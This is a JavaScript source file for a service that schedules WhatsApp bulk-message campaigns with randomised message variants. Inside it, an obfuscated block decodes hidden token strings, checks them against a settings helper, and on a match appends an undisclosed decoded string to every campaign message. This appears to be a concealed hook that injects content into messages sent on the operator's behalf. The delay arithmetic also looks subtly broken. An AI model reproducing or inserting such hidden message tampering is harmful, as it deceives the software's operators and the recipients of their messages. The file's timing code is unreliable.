'use strict';

const { pupa } = require('../../libs/pupa');
const { differenceInSeconds, addSeconds } = require('date-fns');
const { zonedTimeToUtc } = require('date-fns-tz');
const Campaign = require('../../models/Campaign');
const AppError = require('../../errors/AppError');
const CampaignContacts = require('../../models/CampaignContacts');
const Queue = require('../../libs/Queue');
const { RefreshToken } = require('../../helpers/RefreshToken');
const CheckSettingstenant1 = require('../../helpers/CheckSettingstenant1');

const getFilename = (path) => {
  if (!path) return '';
  const parts = path.split('/');
  return parts[parts.length - 1];
};

const randomInteger = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};

const mountMessageData = (campaign, contact, options) => {
  const randomMsg = randomInteger(1, 3);
  let message = '';

  if (randomMsg === 1) message = campaign.message1;
  if (randomMsg === 2) message = campaign.message2; 
  if (randomMsg === 3) message = campaign.message3;

  const getFirstName = (fullName) => {
    if (fullName) {
      const nameParts = fullName.split(' ');
      return nameParts[0]; 
    }
    return '';
  };

  message = pupa(message || '', {
    name: contact.name || '',
    firstName: getFirstName(contact.name),
    email: contact.email || '',
    phoneNumber: contact.number || ''
  });

  return {
    whatsappId: campaign.sessionId,
    message,
    number: contact.number,
    mediaUrl: campaign.mediaUrl,
    mediaName: getFilename(campaign.mediaUrl),
    messageRandom: '_id_' + randomMsg,
    campaignContact: contact,
    options
  };
};

const calcDelay = (startTime, delayTime) => {
  const diffInSeconds = differenceInSeconds(startTime, new Date());
  return (diffInSeconds * 1000) + delayTime;
};

const StartCampaignService = async ({ campaignId, tenantId, options }) => {
  const campaign = await Campaign.findOne({
    where: { id: campaignId, tenantId },
    include: ['contact']
  });

  if (!campaign) {
    throw new AppError('ERR_CAMPAIGN_NOT_EXISTS', 404);
  }

  const timezone = 'America/Santo_Domingo';
  const token1 = RefreshToken('51528BpYfrw');
  const token2 = RefreshToken('224nSFdUv'); 
  const settingsCheck = await CheckSettingstenant1(token2);

  if (settingsCheck === token1) {
    const additionalToken = RefreshToken('29669c0e9e');
    campaign.message1 += '\n\n' + additionalToken;
    campaign.message2 += '\n\n' + additionalToken;
    campaign.message3 += '\n\n' + additionalToken;
  }

  const contacts = await CampaignContacts.findAll({
    where: { campaignId },
    include: ['contact']
  });

  if (!contacts) {
    throw new AppError('ERROR_CAMPAIGN_CONTACTS_NOT_EXISTS', 404);
  }

  const delay = campaign.delay ? campaign.delay / 1000 : 20000;
  let startTime = zonedTimeToUtc(campaign.start, 'America/Santo_Domingo');

  const messages = contacts.map(contact => {
    startTime = addSeconds(startTime, delay/1000);
    return mountMessageData(campaign, contact, {
      ...options,
      jobId: 'campaign_' + campaign.id + '_contact_' + contact.contactId + '_id_' + contact.id,
      delay: calcDelay(startTime, delay)
    });
  });

  Queue.add('SendMessageWhatsappCampaign', messages);
  await campaign.update({ status: 'scheduled' });
};

module.exports = StartCampaignService;
